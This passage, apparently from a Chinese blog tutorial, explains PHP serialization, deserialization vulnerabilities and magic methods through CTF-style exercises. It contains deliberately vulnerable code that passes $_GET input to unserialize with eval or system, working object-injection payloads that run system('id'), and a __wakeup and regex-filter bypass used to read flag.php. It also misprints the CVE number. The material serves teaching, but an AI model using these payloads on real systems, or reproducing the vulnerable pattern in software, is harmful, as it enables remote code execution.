class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:5:"test2":1:{s:3:"ben";O:4:"test":1:{s:3:"pub";s:6:"benben";}}</span></span><br><span class="line"><span class="comment">//O%3A5%3A%22test2%22%3A1%3A%7Bs%3A3%3A%22ben%22%3BO%3A4%3A%22test%22%3A1%3A%7Bs%3A3%3A%22pub%22%3Bs%3A6%3A%22benben%22%3B%7D%7D</span></span><br></pre></td></tr></tbody></table></figure>



<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>1.反序列化之后的内容为一个对象；</p>
<p>2.反序列化生成的对象里面的值，有反序列化里的值提供，与原有类预定义的值无关；</p>
<p>3.反序列化不触发类的成员方法（不包括魔术方法）；需要调用方法后才能触发。</p>
<h3 id="反序列化的作用"><a href="#反序列化的作用" class="headerlink" title="反序列化的作用"></a>反序列化的作用</h3><p>将序列化后的参数还原为实例化的对象</p>
<p>对象&lt;——(反序列化)——-字符串</p>
<p>对象——–(序列化)——-&gt;字符串</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">test</span></span>{</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">'benben'</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$b</span> = <span class="string">'666'</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$c</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">displayVar</span>(<span class="params"></span>)</span>{</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt;a;</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:4:"test":3:{s:1:"a";s:6:"benben";s:4:" * b";s:3:"666";s:7:" test c";b:0;}    </span></span><br><span class="line"><span class="comment">//O%3A4%3A%22test%22%3A3%3A%7Bs%3A1%3A%22a%22%3Bs%3A6%3A%22benben%22%3Bs%3A4%3A%22%00%2A%00b%22%3Bs%3A3%3A%22666%22%3Bs%3A7%3A%22%00test%00c%22%3Bb%3A0%3B%7D</span></span><br></pre></td></tr></tbody></table></figure>



<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">test</span></span>{</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">'benben'</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$b</span> = <span class="string">'666'</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$c</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">displayVar</span>(<span class="params"></span>)</span>{</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt;a;</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$d</span> = <span class="string">'O:4:"test":3:{s:1:"a";s:6:"benben";s:4:"%00*%00b";s:3:"666";s:7:"%00test%00c";b:0;}'</span>;</span><br><span class="line"><span class="variable">$e</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$d</span>);</span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$e</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$f</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">object(test)#1 (3) {</span></span><br><span class="line"><span class="comment">  ["a"]=&gt;</span></span><br><span class="line"><span class="comment">  string(6) "benben"</span></span><br><span class="line"><span class="comment">  ["b":protected]=&gt;</span></span><br><span class="line"><span class="comment">  string(3) "666"</span></span><br><span class="line"><span class="comment">  ["c":"test":private]=&gt;</span></span><br><span class="line"><span class="comment">  bool(false)</span></span><br><span class="line"><span class="comment">}</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></tbody></table></figure>



<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">test</span></span>{</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">'benben'</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$b</span> = <span class="string">'666'</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$c</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">displayVar</span>(<span class="params"></span>)</span>{</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt;a;</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$d</span> = <span class="string">'O:4:"test":3:{s:1:"a";s:6:"benben";s:4:"%00*%00b";s:3:"666";s:7:"%00test%00c";b:0;}'</span>;</span><br><span class="line"><span class="variable">$e</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$d</span>);</span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$e</span>);</span><br><span class="line"><span class="variable">$f</span> -&gt; <span class="title function_ invoke__">displayVar</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//benben</span></span><br></pre></td></tr></tbody></table></figure>



<h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p>成因：反序列化过程中，unserialize接受的值（字符串）可控；更改这个值（字符串），得到所需要的代码，即生成的对象的属性</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">'echo "this is test!!";'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">displayVar</span>(<span class="params"></span>) </span>{</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$get</span> = <span class="string">'O:4:"test":1:{s:1:"a";s:13:"system("id");";}'</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$get</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">//$b-&gt;displayVar() ;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>



<h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p>什么是魔术方法：</p>
<p>一个预定好的，在特定的情况下自动触发的行为方法。</p>
<p>魔术方法的作用：</p>
<p>魔术方法在特定条件下自动调用相关方法，最终导致触发代码</p>
<p><img src="/2024/07/31/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240708143239333.png" alt="image-20240708143239333"></p>
<p>魔术方法的相关机制</p>
<p>触发时机 -&gt; 功能 -&gt; 参数 -&gt; 返回值</p>
<h4 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a><strong>__construct()</strong></h4><p>构造函数，在实例化一个对象的时候，首先会去自动执行的一个方法；</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span></span>) </span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"触发了构造函数1次"</span> ;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">"benben"</span>);</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//触发了构造函数1次</span></span><br></pre></td></tr></tbody></table></figure>



<h4 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a><strong>__destruct()</strong></h4><p>析构函数，在对象的所有引用被删除或者当对象被显示销毁时执行的魔术方法</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"触发了析构函数1次"</span>.<span class="string">"&lt;br /&gt;"</span> ;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">"benben"</span>);    <span class="comment">//触发，实例化对象结束后，代码运行完后销毁，触发析构函数</span></span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);       <span class="comment">//不触发</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);             <span class="comment">//触发，反序列化得到的是对象，代码运行完后销毁，触发析构函数</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//触发了析构函数1次</span></span><br><span class="line"><span class="comment">//触发了析构函数1次</span></span><br></pre></td></tr></tbody></table></figure>

<p><strong>__destruct()漏洞利用</strong></p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>{</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cmd</span> = <span class="string">"echo 'dazhuang666!!';"</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">eval</span> (<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$ser</span> = <span class="variable">$_GET</span>[<span class="string">"benben"</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//?benben=O:4:"User":1:{s:3:"cmd";s:13:"system('id');";}</span></span><br></pre></td></tr></tbody></table></figure>

<h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a><strong>__sleep()</strong></h4><p>触发时机：序列化serialize（）之前</p>
<p>功能：对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性</p>
<p>参数：成员属性</p>
<p>返回值：需要被序列化存储的成员属性</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>{</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">'uusama'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)    </span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'username'</span>, <span class="string">'nickname'</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:"User":2:{s:8:"username";s:1:"a";s:8:"nickname";s:1:"b";}</span></span><br></pre></td></tr></tbody></table></figure>



<h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a><strong>__wakeup()</strong></h4><p>触发时机：unserialize()之前</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>{</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">'uusama'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$user_ser</span> = <span class="string">'O:4:"User":2:{s:8:"username";s:1:"a";s:8:"nickname";s:1:"b";}'</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_ser</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">object(User)#1 (4) {</span></span><br><span class="line"><span class="comment">  ["username"]=&gt;</span></span><br><span class="line"><span class="comment">  string(1) "a"</span></span><br><span class="line"><span class="comment">  ["nickname"]=&gt;</span></span><br><span class="line"><span class="comment">  string(1) "b"</span></span><br><span class="line"><span class="comment">  ["password":"User":private]=&gt;</span></span><br><span class="line"><span class="comment">  string(1) "a"</span></span><br><span class="line"><span class="comment">  ["order":"User":private]=&gt;</span></span><br><span class="line"><span class="comment">  NULL</span></span><br><span class="line"><span class="comment">}</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></tbody></table></figure>

<p>例题</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>{</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">'uusama'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>{</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;username);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$user_ser</span> = <span class="variable">$_GET</span>[<span class="string">'benben'</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>poc</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>{</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>{</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;username);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;username = <span class="string">'id'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//O:4:"User":1:{s:8:"username";s:2:"id";}</span></span><br></pre></td></tr></tbody></table></figure>

<p><strong>绕过姿势</strong></p>
<p>CVE-06-7124</p>
<p>PHP5&lt;5.6.25</p>
<p>PHP7&lt;7.0.10</p>
<p>若将对象属性个数变大，则会使 wakeup 不触发。 </p>
<p><strong>例题</strong></p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>{</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$file</span>=<span class="string">'index.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="variable">$file</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">include_once</span>(<span class="variable language_">$this</span>-&gt;file);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="string">'index.php'</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$cmd</span>)){</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span>{</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">'/[oc]:\d+:/i'</span>,<span class="variable">$cmd</span>)){</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Are you daydreaming?"</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span>{</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="comment">//sercet in flag.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>POC</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>{</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$file</span> = <span class="string">'flag.php'</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">secret</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:6:"secret":1:{s:4:"file";s:8:"flag.php";}</span></span><br><span class="line"><span class="comment">//O:+6:"secret":2:{s:4:"file";s:8:"flag.php";}绕过过滤</span></span><br></pre></td></tr></tbody></table></figure>



<h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a><strong>__toString()</strong></h4><p>触发时机：把对象被当成字符串调用</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>{</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$benben</span> = <span class="string">"this is test!!"</span>;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">         </span>{</span><br><span class="line">             <span class="keyword">return</span> <span class="string">'格式不对，输出不了!'</span>;</span><br><span class="line">          }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;    <span class="comment">//调用字符串</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//User Object ( [benben] =&gt; this is test!! )</span></span><br><span class="line"><span class="comment">//格式不对，输出不了!</span></span><br></pre></td></tr></tbody></table></figure>

<h4 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a><strong>__invoke()</strong></h4><p>触发时机：把对象当成函数调用</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>{</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$benben</span> = <span class="string">"this is test!!"</span>;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">         </span>{</span><br><span class="line">             <span class="keyword">echo</span>  <span class="string">'它不是个函数!'</span>;</span><br><span class="line">          }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span> -&gt;benben;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>() -&gt;benben;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//this is test!!</span></span><br><span class="line"><span class="comment">//它不是个函数!</span></span><br></pre></td></tr></tbody></table></figure>



<h4 id="call"><a href="#call" class="headerlink" title="__call()"></a><strong>__call()</strong></h4><p>触发时机：调用不存在的方法</p>
<p>参数：两个参数传参</p>
<p>返回值：调用的不存在的方法的名称和参数</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]"</span>;</span><br><span class="line">          }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span> -&gt; <span class="title function_ invoke__">callxxx</span>(<span class="string">'a'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//callxxx,a</span></span><br></pre></td></tr></tbody></table></figure>



<h4 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic()"></a><strong>__callStatic()</strong></h4><p>触发时机：静态调用或调用成员常量时使用了不存在的方法</p>
<p>参数：两个参数传参</p>
<p>返回值：调用的不存在的方法的名称和参数</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]"</span>;</span><br><span class="line">          }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span>::<span class="title function_ invoke__">callxxx</span>(<span class="string">'a'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//callxxx,a</span></span><br></pre></td></tr></tbody></table></figure>



<h4 id="get"><a href="#get" class="headerlink" title="__get()"></a><strong>__get()</strong></h4><p>触发时机：调用的成员属性不存在</p>
<p>参数：传参$arg1</p>
<p>返回值：不存在的成员属性名称</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span> -&gt;var2;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//var2</span></span><br></pre></td></tr></tbody></table></figure>



<h4 id="set"><a href="#set" class="headerlink" title="__set()"></a><strong>__set()</strong></h4><p>触发时机：给不存在的成员属性赋值</p>
<p>参数：传参$arg1 $arg2</p>
<p>返回值：不存在的成员属性名称和赋的值</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span> ,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>.<span class="string">','</span>.<span class="variable">$arg2</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span> -&gt;var2=<span class="number">1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//var2,1</span></span><br></pre></td></tr></tbody></table></figure>



